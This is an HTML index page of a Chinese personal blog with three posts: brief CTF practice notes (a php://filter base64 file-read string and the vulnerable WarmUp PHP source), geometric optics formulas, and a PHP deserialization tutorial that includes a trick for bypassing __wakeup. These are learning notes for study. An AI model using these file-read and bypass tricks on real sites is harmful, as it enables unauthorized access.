<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/%E9%B8%A132.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/%E9%B8%A116.svg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yatq.xyz","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="心不畏死，踏屍前行">
<meta property="og:type" content="website">
<meta property="og:title" content="y@7q">
<meta property="og:url" content="http://yatq.xyz/page/2/index.html">
<meta property="og:site_name" content="y@7q">
<meta property="og:description" content="心不畏死，踏屍前行">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="y@7q">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yatq.xyz/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>y@7q</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">y@7q</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/%E5%88%B7%E9%A2%98/buuctf%E5%88%B7%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/%E5%88%B7%E9%A2%98/buuctf%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">buuctf刷题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-06-06 18:58:37" itemprop="dateCreated datePublished" datetime="2025-06-06T18:58:37+08:00">2025-06-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-25 22:03:32" itemprop="dateModified" datetime="2025-06-25T22:03:32+08:00">2025-06-25</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <span id="more"></span>

<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>考点：php伪协议</p>
<p><code>php://filter/read=convert.base64-encode/resource</code></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250606223858751.png" alt="image-20250606223858751"></p>
<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>考点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>考点：命令执行</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250606225803602.png" alt="image-20250606225803602"></p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>考点：RCE 绕过</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/%E7%89%A9%E7%90%86/%E5%85%89%E5%AD%A6%E7%AC%94%E8%AE%B01_%E5%87%A0%E4%BD%95%E5%85%89%E5%AD%A6%E6%88%90%E5%83%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/%E7%89%A9%E7%90%86/%E5%85%89%E5%AD%A6%E7%AC%94%E8%AE%B01_%E5%87%A0%E4%BD%95%E5%85%89%E5%AD%A6%E6%88%90%E5%83%8F/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-05-20 02:00:09" itemprop="dateCreated datePublished" datetime="2025-05-20T02:00:09+08:00">2025-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-29 15:10:17" itemprop="dateModified" datetime="2025-06-29T15:10:17+08:00">2025-06-29</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2几何光学成像"><a href="#2几何光学成像" class="headerlink" title="2几何光学成像"></a>2几何光学成像</h1><h2 id="2-3半球面折射及透镜成像"><a href="#2-3半球面折射及透镜成像" class="headerlink" title="2.3半球面折射及透镜成像"></a>2.3半球面折射及透镜成像</h2><h3 id="半球面折射成像"><a href="#半球面折射成像" class="headerlink" title="半球面折射成像"></a>半球面折射成像</h3><p><strong>阿贝不变式：</strong><br>$$<br>\frac{n’}{s’} - \frac{n}{s} &#x3D; \frac{n’ - n}{r}<br>$$<br><strong>物方像方焦点公式：</strong><br>$$<br>f &#x3D; \frac{nr}{n - n’}\<br>f’ &#x3D; \frac{n’r}{n’ - n}\<br>\frac{f}{f’} &#x3D; -\frac{n}{n’}<br>$$</p>
<p>关于我对老师所教的一套符号法则的理解和总结：</p>
<ol>
<li><p><strong>用加号高斯公式时，所有距离全正（几何长度）</strong></p>
</li>
<li><p><strong>用减号折射&#x2F;笛卡尔公式时，所有距离按方向带正负号</strong></p>
</li>
<li><p><strong>焦距符号永远物理推导</strong></p>
</li>
</ol>
<h3 id="透镜成像相关公式"><a href="#透镜成像相关公式" class="headerlink" title="透镜成像相关公式"></a>透镜成像相关公式</h3><p><strong>磨镜者公式：</strong><br>$$</p>
<ul>
<li>f &#x3D; f’ &#x3D; \frac{1}{(n_L - 1)\left( \frac{1}{r_1} - \frac{1}{r_2} \right)}<br>$$<br><strong>透镜成像高斯公式（左为一般形式）：</strong><br>$$<br>\frac{f’}{s’} + \frac{f}{s} &#x3D; 1 \overset{f &#x3D; f’}{\Rightarrow} \frac{1}{s’} + \frac{1}{s} &#x3D; \frac{1}{f}<br>$$<br>右式用途广泛。</li>
</ul>
<p><strong>注意：</strong></p>
<p>这两个公式所说的f是整个薄透镜的焦距而不是单个球面。凸透镜为正，凹透镜为负。</p>
<p><strong>透镜成像牛顿公式：</strong></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250520013802796.png" alt="image-20250520013802796"><br>$$<br>\left{<br>\begin{aligned}<br>s &amp;&#x3D; x + f \<br>s’ &amp;&#x3D; x’ + f’<br>\end{aligned}<br>\right.<br>\overset{将这两个式子带入高斯公式得到}{\Rightarrow} xx’ &#x3D; f^2<br>$$</p>
<p>主要探讨了物&#x2F;像分别到焦点的距离x&#x2F;x’和焦距f的关系。</p>
<h3 id="两类薄透镜作图法（略）"><a href="#两类薄透镜作图法（略）" class="headerlink" title="两类薄透镜作图法（略）"></a>两类薄透镜作图法（略）</h3><p>重点讲解：作平行于入射光线的副光轴交焦平面于副焦点，把然后按照常规来做。</p>
<p><strong>凸透镜：</strong></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250520021844362.png" alt="image-20250520021844362"></p>
<p><strong>凹透镜：</strong></p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250520021805220.png" alt="image-20250520021805220"></p>
<h3 id="球面反射"><a href="#球面反射" class="headerlink" title="球面反射"></a>球面反射</h3><p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250520023158945.png" alt="image-20250520023158945"><br>$$<br>f &#x3D; \frac{r}{2}<br>$$<br>作图与以上一致。</p>
<h3 id="放大率"><a href="#放大率" class="headerlink" title="放大率"></a>放大率</h3><p>重点只看两个，线放大率$\beta$  和轴向放大率$\alpha$</p>
<p><strong>线放大率$\beta$</strong>  </p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250520024751488.png" alt="image-20250520024751488"></p>
<p>图中有另外两对相似三角形来表示它，左下，右上。</p>
<p><strong>轴向放大率</strong>$\alpha$</p>
<h2 id="2-4逐次成像法"><a href="#2-4逐次成像法" class="headerlink" title="2.4逐次成像法"></a>2.4逐次成像法</h2><p>$$<br>-f_1 &#x3D; \frac{r_1}{1 - n}\<br>f_1’ &#x3D; \frac{nr_1}{n - 1}\<br>f_2 &#x3D; \frac{-nr_2}{n - 1}\<br>-f_2’ &#x3D; \frac{-r_2}{1 - n}\<br>f &#x3D; \frac{f_1f_2}{\Delta} \overset{带入f_1f_2以及\Delta &#x3D;f_2 - f_1’ + d }{\Rightarrow} f &#x3D; \frac{f_1f_2}{f_2 - f_1’ + d} \Rightarrow<br>$$</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">反序列化学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-05-04 14:59:24" itemprop="dateCreated datePublished" datetime="2025-05-04T14:59:24+08:00">2025-05-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-07-31 14:07:37" itemprop="dateModified" datetime="2025-07-31T14:07:37+08:00">2025-07-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">基础知识搭建</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>简单来说，序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。反序列化则相反将字符串重新恢复成对象。<strong>反序列化漏洞</strong>便是在这中间产生的，构造利用链，根据各种魔术方法进行跳转，从而达到RCE，getshell等不可控的后果。</p>
<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>谈到反序列化的时候必然要谈到序列化，下面是在php中，对应的两个重要函数：</p>
<h3 id="序列化函数serialize-："><a href="#序列化函数serialize-：" class="headerlink" title="序列化函数serialize()："></a><strong>序列化函数</strong><code>serialize()</code>：</h3><p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$u</span>-&gt;isAdmin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;isAdmin&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>序列化片段</th>
<th>含义说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>O:4:&quot;User&quot;</code></td>
<td><strong>O</strong> 表示对象（Object），类名长度为 4，类名是 <code>&quot;User&quot;</code></td>
</tr>
<tr>
<td><code>:1:</code></td>
<td>对象有 1 个属性</td>
</tr>
<tr>
<td><code>&#123;...&#125;</code></td>
<td>花括号中是属性列表</td>
</tr>
<tr>
<td><code>s:7:&quot;isAdmin&quot;;</code></td>
<td><strong>s</strong> 表示字符串，长度为 7，字符串内容是 <code>&quot;isAdmin&quot;</code>（属性名）</td>
</tr>
<tr>
<td><code>b:1;</code></td>
<td><strong>b</strong> 表示布尔类型，值为 true（1），false 为 0</td>
</tr>
</tbody></table>
<p><strong>常见表示</strong>：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>表示符</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>布尔</td>
<td><code>b:x;</code></td>
<td><code>b:1;</code></td>
<td>true&#x2F;false</td>
</tr>
<tr>
<td>整数</td>
<td><code>i:x;</code></td>
<td><code>i:42;</code></td>
<td>数值</td>
</tr>
<tr>
<td>浮点</td>
<td><code>d:x;</code></td>
<td><code>d:3.14;</code></td>
<td>double</td>
</tr>
<tr>
<td>字符串</td>
<td><code>s:n:&quot;val&quot;;</code></td>
<td><code>s:5:&quot;hello&quot;;</code></td>
<td>长度为 n 的字符串</td>
</tr>
<tr>
<td>数组</td>
<td><code>a:n:&#123;...&#125;</code></td>
<td><code>a:2:&#123;i:0;s:3:&quot;abc&quot;;i:1;i:123;&#125;</code></td>
<td>n 个键值对</td>
</tr>
<tr>
<td>对象</td>
<td><code>O:n:&quot;class&quot;:p:&#123;...&#125;</code></td>
<td><code>O:4:&quot;User&quot;:1:&#123;s:3:&quot;id&quot;;i:1;&#125;</code></td>
<td>类名长度为 n，p 为属性数</td>
</tr>
<tr>
<td>NULL</td>
<td><code>N;</code></td>
<td><code>N;</code></td>
<td>空值</td>
</tr>
</tbody></table>
<p><code>__sleep()</code> 是 PHP 的一个魔术方法，会在对象被 <code>serialize()</code> 时自动调用，主要用于控制哪些属性被序列化。</p>
<p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作，即**<code>__sleep()</code>可以决定序列化的内容。**</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;username&quot;</span>]; <span class="comment">// 仅序列化 username</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;isAdmin = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//结果：</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到只序列化了<code>$username</code>，而没有<code>$isAdmin</code>。</p>
<h3 id="反序列化函数unserialize-："><a href="#反序列化函数unserialize-：" class="headerlink" title="反序列化函数unserialize()："></a><strong>反序列化函数</strong><code>unserialize()</code>：</h3><p>与序列化函数类似，<code>unserialize()</code>会检查类中是否存在一个<code>__wakeup</code>魔术方法，如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化。</p>
<p><strong>小trick</strong>：<strong>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过<code>__wakeup</code>的执行</strong>。</p>
<h3 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>(公有) </span><br><span class="line"><span class="keyword">protected</span>(受保护)     <span class="comment">// %00*%00属性名</span></span><br><span class="line"><span class="keyword">private</span>(私有的)       <span class="comment">// %00类名%00属性名</span></span><br></pre></td></tr></table></figure>

<p>protected属性被序列化的时候<strong>属性值</strong>会变成<code>%00\*%00属性名</code>，private属性被序列化的时候<strong>属性值</strong>会变成<code>%00类名%00属性名</code>，<code>%00</code>空字符长度为 1。</p>
<p><strong>各自权限：</strong></p>
<ul>
<li><strong>public（公有）：</strong> 公有的类成员可以在任何地方被访问。</li>
